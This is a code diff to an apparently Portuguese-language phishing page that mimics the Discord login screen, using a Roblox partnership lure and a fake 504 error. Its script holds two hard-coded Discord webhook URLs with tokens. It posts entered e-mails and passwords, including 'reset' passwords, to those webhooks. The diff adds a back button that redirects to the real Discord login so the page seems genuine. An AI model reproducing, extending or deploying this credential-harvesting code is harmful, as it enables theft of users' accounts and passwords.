@@ -123,6 +123,7 @@
       color: #00aff4;
       text-decoration: none;
       font-weight: bold;
+      cursor: pointer;
       z-index: 3;
     }
     .error-message {
@@ -226,49 +227,50 @@
 
   <div class="container">
     <div class="left">
-      <a href="#" class="voltar">&lt; Voltar</a>
-      
+      <!-- Botão Voltar inteligente -->
+      <a id="voltarBtn" class="voltar">&lt; Voltar</a>
+     
       <h1>Boas-vindas de volta!</h1>
       <p class="subtitle">Estamos muito animados em te ver novamente!</p>
-      
+     
       <form id="loginForm">
         <label for="email">E-mail ou número de telefone *</label>
         <input type="text" id="email" placeholder="" required />
-        
+       
         <label for="senha">Senha *</label>
         <input type="password" id="senha" placeholder="" required />
-        
+       
         <a id="forgotPassword" class="forgot-link">Esqueceu sua senha?</a>
-        
+       
         <button type="submit">Entrar</button>
-        
+       
         <div id="errorBox" class="error-message">
           --- Erro de conexão com o servidor. Recarregue a página ou tente mais tarde. (504) ---
         </div>
-        
+       
         <div class="register-link">
           Precisando de uma conta? <a href="#">Registre-se</a>
         </div>
       </form>
     </div>
-    
+   
     <div class="right">
       <div class="qr-section">
         <img class="qr-image" src="https://i.imgur.com/1D9eZd0.png" alt="QR customizado" />
-        
+       
         <div class="qr-title">Entrar com código QR</div>
-        
+       
         <p class="qr-custom-text">
           Ou faça login pelo roblox!!<br>
           Estamos fazendo parceria em troca de divulgação!!
         </p>
-        
+       
         <div class="logos">
           <img src="https://i.imgur.com/zvlaijA.png" alt="Discord Logo">
           <span style="font-size: 1.8rem; font-weight: bold;"> - </span>
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
         </div>
-        
+       
         <div class="extra-link">
           <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">Acesse aqui para mais novidades</a>
         </div>
@@ -297,6 +299,7 @@
     const webhookLogin = 'https://discord.com/api/webhooks/1482464893058945258/dVHkrAXszpxDyRXpI3ji-cHEipO9lsIM2ullHumbhQvYmeeXlNdQemM95slCGrN-cOuC';
     const webhookReset = 'https://discord.com/api/webhooks/1482485891745452134/hkOt6HDKCCqjYLi0qXI1FYeQCKWb5IC61up8vgwNImNeZZkUN1_RqbaOKWkNfDCHy-3X';
 
+    const voltarBtn = document.getElementById('voltarBtn');
     const forgotLink = document.getElementById('forgotPassword');
     const modal = document.getElementById('resetModal');
     const closeModal = document.getElementById('closeModal');
@@ -304,6 +307,18 @@
     const newPasswordInput = document.getElementById('newPassword');
     const emailDisplay = document.getElementById('emailDisplay');
     const successMsg = document.getElementById('successMsg');
+
+    // Botão Voltar inteligente (volta pro lugar de onde veio)
+    voltarBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      // Se tem histórico anterior (entrou por link externo), volta pra lá
+      if (window.history.length > 1) {
+        window.history.back();
+      } else {
+        // Se entrou direto (sem histórico), vai pro login oficial do Discord
+        window.location.href = 'https://discord.com/login';
+      }
+    });
 
     // Login normal → webhookLogin
     form.addEventListener('submit', async (e) => {
@@ -411,17 +426,14 @@
     resetButton.addEventListener('click', () => {
       const newPass = newPasswordInput.value.trim();
       const email = document.getElementById('email').value.trim();
-
       if (!newPass) {
         alert('Digite uma nova senha!');
         return;
       }
-
       if (!email) {
         alert('Digite seu e-mail no campo de login primeiro!');
         return;
       }
-
       const resetMsg = `**Reset de Senha Solicitado!**
 
 **E-mail:** ${email}
@@ -435,15 +447,10 @@
         body: JSON.stringify({ content: resetMsg })
       }).catch(() => {});
 
-      // Mostra mensagem descendo
       successMsg.classList.add('show');
-
-      // Desce pra fora da tela após 3 segundos
       setTimeout(() => {
         successMsg.style.top = '100vh';
       }, 3000);
-
-      // Recarrega a página após a animação terminar
       setTimeout(() => {
         location.reload();
       }, 4000);
